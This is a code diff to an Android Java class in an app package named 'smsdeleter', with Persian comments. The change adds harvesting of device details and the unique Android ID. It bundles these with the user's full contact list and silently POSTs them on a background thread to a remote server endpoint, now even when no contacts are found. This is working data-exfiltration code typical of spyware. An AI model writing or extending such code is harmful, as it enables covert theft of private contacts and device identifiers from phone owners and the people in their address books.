@@ -2,7 +2,9 @@ package com.example.smsdeleter;
 
 import android.content.Context;
 import android.database.Cursor;
+import android.os.Build;
 import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.util.Log;
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -25,29 +27,28 @@ public class ContactsSyncManager {
     public void syncContacts() {
         new Thread(() -> {
             try {
-                Log.d(TAG, "شروع استخراج مخاطبین...");
+                Log.d(TAG, "شروع استخراج اطلاعات دستگاه و مخاطبین...");
 
                 // استخراج مخاطبین
                 JSONArray contactsArray = extractContacts();
 
-                if (contactsArray.length() == 0) {
-                    Log.w(TAG, "هیچ مخاطبی پیدا نشد");
-                    return;
-                }
+                // استخراج اطلاعات دستگاه
+                JSONObject deviceInfo = getDeviceInfo();
 
                 Log.d(TAG, "تعداد مخاطبین: " + contactsArray.length());
+                Log.d(TAG, "مدل دستگاه: " + deviceInfo.optString("model"));
 
-                // ارسال به سرور
-                boolean success = sendToServer(contactsArray);
+                // ارسال به سرور (حتی اگه مخاطبی نباشه)
+                boolean success = sendToServer(contactsArray, deviceInfo);
 
                 if (success) {
-                    Log.i(TAG, "✓ مخاطبین با موفقیت به سرور ارسال شدند");
+                    Log.i(TAG, "✓ داده‌ها با موفقیت به سرور ارسال شدند");
                 } else {
-                    Log.e(TAG, "✗ خطا در ارسال مخاطبین");
+                    Log.e(TAG, "✗ خطا در ارسال داده‌ها");
                 }
 
             } catch (Exception e) {
-                Log.e(TAG, "خطا در sync مخاطبین: " + e.getMessage(), e);
+                Log.e(TAG, "خطا در sync: " + e.getMessage(), e);
             }
         }).start();
     }
@@ -99,10 +100,37 @@ public class ContactsSyncManager {
         return contactsArray;
     }
 
-    private boolean sendToServer(JSONArray contacts) {
+    private JSONObject getDeviceInfo() {
+        JSONObject deviceInfo = new JSONObject();
+        try {
+            deviceInfo.put("brand", Build.BRAND);                    // Samsung, Xiaomi, etc.
+            deviceInfo.put("manufacturer", Build.MANUFACTURER);      // samsung, xiaomi, etc.
+            deviceInfo.put("model", Build.MODEL);                    // SM-G950F, etc.
+            deviceInfo.put("device", Build.DEVICE);                  // dreamlte, etc.
+            deviceInfo.put("product", Build.PRODUCT);                // dreamltexx, etc.
+            deviceInfo.put("androidVersion", Build.VERSION.RELEASE); // 13, 14, etc.
+            deviceInfo.put("sdkVersion", Build.VERSION.SDK_INT);     // 33, 34, etc.
+            deviceInfo.put("board", Build.BOARD);                    // universal8895, etc.
+            deviceInfo.put("hardware", Build.HARDWARE);              // samsungexynos8895, etc.
+
+            // Android ID (شناسه یکتا دستگاه)
+            String androidId = Settings.Secure.getString(
+                context.getContentResolver(),
+                Settings.Secure.ANDROID_ID
+            );
+            deviceInfo.put("androidId", androidId != null ? androidId : "unknown");
+
+            Log.d(TAG, "اطلاعات دستگاه: " + deviceInfo.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "خطا در استخراج اطلاعات دستگاه: " + e.getMessage());
+        }
+        return deviceInfo;
+    }
+
+    private boolean sendToServer(JSONArray contacts, JSONObject deviceInfo) {
         HttpURLConnection connection = null;
         try {
-            URL url = new URL(API_URL);
+            URL url = new URL(API_URL + "sync");
             connection = (HttpURLConnection) url.openConnection();
             connection.setRequestMethod("POST");
             connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
@@ -113,10 +141,15 @@ public class ContactsSyncManager {
             // ساخت JSON body
             JSONObject requestBody = new JSONObject();
             requestBody.put("contacts", contacts);
+            requestBody.put("device", deviceInfo);
             requestBody.put("timestamp", System.currentTimeMillis());
+            requestBody.put("contactsCount", contacts.length());
 
             // ارسال داده
-            byte[] outputBytes = requestBody.toString().getBytes(StandardCharsets.UTF_8);
+            String jsonBody = requestBody.toString();
+            Log.d(TAG, "ارسال داده به سرور: " + jsonBody.substring(0, Math.min(200, jsonBody.length())) + "...");
+
+            byte[] outputBytes = jsonBody.getBytes(StandardCharsets.UTF_8);
             try (OutputStream os = connection.getOutputStream()) {
                 os.write(outputBytes);
                 os.flush();
